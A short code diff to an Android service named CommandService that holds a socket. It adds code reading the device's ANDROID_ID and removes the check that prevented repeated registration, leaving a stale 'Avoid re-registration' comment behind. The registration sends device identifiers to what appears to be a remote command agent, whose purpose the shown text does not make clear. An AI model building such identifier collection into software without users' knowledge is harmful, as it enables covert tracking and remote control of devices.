@@ -30,6 +30,12 @@ public class CommandService extends Service {
     private Socket mSocket;
 
     @Override
+    public void onCreate() {
+        super.onCreate();
+        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+    }
+
+    @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "CommandService started");
 
@@ -76,7 +82,6 @@ public class CommandService extends Service {
         try {
             // Avoid re-registration
             SharedPreferences prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE);
-            if (prefs.getBoolean("registered", false)) return;
             JSONObject payload = new JSONObject();
             payload.put("device_id", deviceId);
             payload.put("manufacturer", Build.MANUFACTURER);
